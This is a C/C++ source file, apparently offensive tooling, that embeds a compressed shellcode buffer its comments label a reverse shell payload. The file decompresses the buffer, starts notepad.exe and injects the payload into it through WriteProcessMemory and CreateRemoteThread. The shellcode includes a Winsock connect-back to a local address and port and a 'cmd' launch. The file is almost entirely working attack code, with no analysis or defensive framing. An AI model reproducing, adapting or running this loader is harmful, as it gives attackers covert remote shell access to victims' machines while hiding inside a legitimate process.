#include "Win32Helper.h"

#pragma section(".text")



INT main(void) {

	//reverse shell compressed payload buffer
	BYTE CompressedBuffer[] = { 0xde,0xb1,0x0,0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x0,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0xa,0x60,0x0,0x18,0x18,0x0,0x18,0x20,0x48,0x8b,0x72,0x0,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0x0,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x0,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x80,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x1,0x4a,0x0,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x82,0x88,0x0,0x90,0x48,0x85,0xc0,0x74,0x67,0x0,0x1a,0x0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x0,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x80,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4,0x8e,0x1,0x4,0x82,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x0,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x5,0x0,0x2f,0x24,0x0,0x2f,0x66,0x41,0x8b,0xc,0x48,0x45,0x0,0xb,0x1c,0x0,0xb,0x41,0x8b,0x4,0x0,0x36,0xd0,0x80,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x0,0x6,0x0,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x0,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x0,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x0,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x1,0x0,0xca,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0x0,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0x0,0xbc,0x2,0x0,0x23,0x29,0x7f,0x0,0x0,0x0,0x1,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0x0,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0x40,0xd5,0x4c,0x89,0xea,0x68,0x1,0x0,0x12,0x59,0x0,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x4,0x50,0x50,0x0,0x4f,0x4d,0x31,0xc0,0x48,0xff,0x10,0xc0,0x48,0x89,0xc2,0x82,0x2,0xc1,0x41,0xba,0x0,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0x0,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x0,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x42,0x61,0x0,0xa,0x81,0xc4,0x40,0x2,0x80,0x32,0xb8,0x18,0x63,0x6d,0x64,0x80,0x7d,0x80,0x3d,0x50,0x41,0x50,0x40,0x48,0x89,0xe2,0x57,0x57,0x57,0x0,0x23,0x6a,0x0,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x0,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x0,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0xa,0x56,0x80,0x12,0x41,0x80,0x1,0x49,0xff,0xc0,0x41,0x0,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x42,0x89,0x80,0x34,0x79,0xcc,0x3f,0x86,0x0,0x2a,0x31,0x0,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x0,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0x0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x2,0x9d,0x0,0xe,0x83,0xc4,0x28,0x3c,0x6,0x7c,0x0,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x0,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0x70,0xda,0xff,0xd5,0xcc,0x14,0x0,0x81,0x4b,0x95,0xd,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0 };

	//size of payload buffer
	DWORD Size = sizeof(CompressedBuffer);

	HMODULE hMod = NULL;
	ULONG Out = sizeof(CompressedBuffer);
	DWORD oldProtect = NULL;

	PBYTE DecompressedBuffer = CompressedBuffer;

	//Allocate new payload
	DecompressedBuffer = (PBYTE)VirtualAlloc(NULL, Out * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//Decompress payload
	Out = LzStandardDecompressBuffer((PBYTE)CompressedBuffer, Size, (PBYTE)DecompressedBuffer, Out);

	//Create notepad.exe
	CreateProcessByWindowsRHotKeyExA((PCHAR) "C:\\Windows\\System32\\notepad.exe");
	Sleep(1000);

	//Find target
	CHAR targetName[] = "notepad.exe\0";
	auto targetPID = GetPidFromEnumProcessesA(targetName);


	//Execute payload in target
	MpfPiWriteProcessMemoryCreateRemoteThread((PBYTE)DecompressedBuffer, Size, targetPID);


	if (DecompressedBuffer)
		HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, DecompressedBuffer);

	return ERROR_SUCCESS;
}